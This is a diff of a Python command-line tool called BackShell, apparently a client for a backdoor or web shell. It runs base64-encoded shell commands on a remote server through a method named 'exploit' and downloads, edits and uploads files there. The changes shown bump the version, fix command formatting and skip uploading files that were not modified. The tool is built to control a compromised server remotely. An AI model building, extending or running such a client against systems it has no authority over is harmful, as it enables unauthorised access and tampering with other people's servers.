@@ -20,7 +20,7 @@ try:
 except ImportError:
     readline = None
 
-__version__ = '0.1.2'
+__version__ = '0.1.3'
 __author__ = 'Sergey M <yamldeveloper@proton.me>'
 __description__ = __doc__
 
@@ -33,7 +33,6 @@ BANNER = r"""
 v{} by s3rgeym
 
 Type '?' or 'help' for more information.
-
 """.format(
     __version__
 )
@@ -109,13 +108,13 @@ class BackShell(Cmd):
     def exploit(self, command: str) -> str:
         redirect = '2>&1'
         # BAD: nohup command & 2>&1
-        # OK: nohup command 2>&1 &
+        # GOOD: nohup command 2>&1 &
         if command.endswith('&'):
             command = command[:-1] + redirect + ' &'
         else:
             command += ' ' + redirect
         if self.cwd:
-            command = 'cd {};'.format(self.cwd) + command
+            command = 'cd {}; '.format(self.cwd) + command
         logging.debug(command)
         encoded = base64.b64encode(command.encode()).decode()
         try:
@@ -166,13 +165,20 @@ class BackShell(Cmd):
         with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as temp:
             # скачиваем файл
             self.download(arg, temp)
+            mt = os.stat(temp.fileno()).st_mtime
             # редактируем
             subprocess.call([EDITOR, temp.name])
-            temp.seek(0)
-            contents = temp.read()
-            # загружаем на сервер
-            output = self.upload(contents, arg)
-            print(output)
+            # если время модфикации файла не изменилось не гоняем лишние байты
+            # по сети
+            if os.stat(temp.fileno()).st_mtime > mt:
+                temp.seek(0)
+                contents = temp.read()
+                # загружаем на сервер
+                output = self.upload(contents, arg)
+                print(output)
+            else:
+                print('Not modified')
+            os.unlink(temp.name)
 
     def do_cdx(self, arg: str) -> None:
         "fixed cd"
